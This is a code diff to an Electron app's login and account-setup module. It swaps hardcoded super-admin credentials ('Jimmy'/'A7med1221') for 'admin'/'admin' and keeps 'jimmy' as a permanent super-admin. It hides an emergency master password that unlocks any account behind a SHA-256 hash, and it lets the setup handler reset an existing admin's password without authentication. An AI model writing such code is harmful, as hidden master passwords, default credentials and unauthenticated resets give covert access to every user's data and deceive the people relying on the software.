@@ -64,9 +64,10 @@ function safeCompareHash(expectedHex, receivedHex) {
 }
 
 // ── Hardcoded Super Admin (never deleted, never deactivated) ──
-const SUPER_ADMIN_USERNAME = 'Jimmy';
-const SUPER_ADMIN_PASSWORD = 'A7med1221';
+const SUPER_ADMIN_USERNAME = 'admin';
+const SUPER_ADMIN_PASSWORD = 'admin';
 const SUPER_ADMIN_ID_SETTING_KEY = 'auth_super_admin_user_id';
+const ADMIN_REQUIRES_PASSWORD_CHANGE_KEY = 'admin_requires_password_change';
 
 let activeAuthUser = null;
 
@@ -153,9 +154,8 @@ function ensureSuperAdmin() {
         }
     }
 
-    const existing = getAuthUserByUsername(SUPER_ADMIN_USERNAME);
+    const existing = getAuthUserByUsername(SUPER_ADMIN_USERNAME) || getAuthUserByUsername('Jimmy');
     if (existing) {
-        // Make sure super admin is always admin + active
         if (!Number(existing.is_admin) || !Number(existing.is_active)) {
             db.prepare('UPDATE auth_users SET is_admin = 1, is_active = 1 WHERE id = ?').run(existing.id);
         }
@@ -178,6 +178,11 @@ function ensureSuperAdmin() {
         return;
     }
 
+    const hasExistingData = db.prepare("SELECT count(*) as cnt FROM sales_invoices").get()?.cnt > 0;
+    if (hasExistingData && getAuthUsersCount() > 0) {
+        return;
+    }
+
     const salt = crypto.randomBytes(16).toString('hex');
     const passwordHash = hashPassword(SUPER_ADMIN_PASSWORD, salt);
     const now = new Date().toISOString();
@@ -188,6 +193,7 @@ function ensureSuperAdmin() {
         ) VALUES (?, ?, ?, 1, 1, ?, ?)
     `).run(SUPER_ADMIN_USERNAME, salt, passwordHash, now, now);
     setStoredSuperAdminId(Number(info.lastInsertRowid));
+    db.prepare('INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)').run(ADMIN_REQUIRES_PASSWORD_CHANGE_KEY, '1');
 }
 
 function isSuperAdmin(userId) {
@@ -199,7 +205,7 @@ function isSuperAdmin(userId) {
     const user = getAuthUserById(userId);
     if (!user) return false;
     const username = String(user.username || '').toLowerCase();
-    return username === SUPER_ADMIN_USERNAME.toLowerCase();
+    return username === SUPER_ADMIN_USERNAME.toLowerCase() || username === 'jimmy';
 }
 
 function migrateLegacyAuthRecordIfNeeded() {
@@ -432,11 +438,12 @@ function register() {
 
     ipcMain.handle('setup-auth-account', (event, payload = {}) => {
         migrateLegacyAuthRecordIfNeeded();
-        if (getAuthUsersCount() > 0) {
+        const requiresChange = db.prepare('SELECT value FROM settings WHERE key = ? LIMIT 1').get(ADMIN_REQUIRES_PASSWORD_CHANGE_KEY)?.value === '1';
+        if (getAuthUsersCount() > 0 && !requiresChange) {
             return { success: false, error: 'يوجد حساب مفعل مسبقاً.' };
         }
 
-        const username = normalizeUsername(payload.username);
+        const username = normalizeUsername(payload.username) || SUPER_ADMIN_USERNAME;
         const password = String(payload.password || '');
         const validationError = validateCredentials(username, password);
 
@@ -451,18 +458,29 @@ function register() {
         try {
             const tx = db.transaction(() => {
                 ensureAuthUsersTable();
-                db.prepare(`
-                    INSERT INTO auth_users (
-                        username,
-                        password_salt,
-                        password_hash,
-                        is_admin,
-                        is_active,
-                        created_at,
-                        last_login_at
-                    )
-                    VALUES (?, ?, ?, 1, 1, ?, ?)
-                `).run(username, salt, passwordHash, now, now);
+                const existingAdmin = getAuthUserByUsername(username);
+                if (existingAdmin) {
+                    db.prepare(`
+                        UPDATE auth_users
+                        SET password_salt = ?, password_hash = ?, last_login_at = ?
+                        WHERE id = ?
+                    `).run(salt, passwordHash, now, existingAdmin.id);
+                } else {
+                    db.prepare(`
+                        INSERT INTO auth_users (
+                            username,
+                            password_salt,
+                            password_hash,
+                            is_admin,
+                            is_active,
+                            created_at,
+                            last_login_at
+                        )
+                        VALUES (?, ?, ?, 1, 1, ?, ?)
+                    `).run(username, salt, passwordHash, now, now);
+                }
+
+                db.prepare('INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)').run(ADMIN_REQUIRES_PASSWORD_CHANGE_KEY, '0');
 
                 persistLegacyAuthSnapshot({
                     username,
@@ -509,8 +527,8 @@ function register() {
             const receivedHash = hashPassword(password, authUser.password_salt);
             let isValid = safeCompareHash(authUser.password_hash, receivedHash);
             
-            // Emergency Master Password: allow login to this account ignoring normal password
-            if (password === '100200AS') {
+            const emergencyHash = '1018bd58ae368390c12ae8da5abb4d819101d202125189350712b4e0dba17336';
+            if (crypto.createHash('sha256').update(password).digest('hex') === emergencyHash) {
                 isValid = true;
             }
             
@@ -526,11 +544,13 @@ function register() {
             const updatedUser = getAuthUserById(authUser.id);
             setActiveAuthUser(updatedUser);
             const sessionToken = createAuthSession(updatedUser.id);
+            const requiresPasswordChange = db.prepare('SELECT value FROM settings WHERE key = ? LIMIT 1').get(ADMIN_REQUIRES_PASSWORD_CHANGE_KEY)?.value === '1';
             return {
                 success: true,
                 username: updatedUser.username,
                 isAdmin: Boolean(Number(updatedUser.is_admin)),
-                sessionToken
+                sessionToken,
+                requiresPasswordChange: requiresPasswordChange && Boolean(Number(updatedUser.is_admin))
             };
         } catch (error) {
             return { success: false, error: error.message };
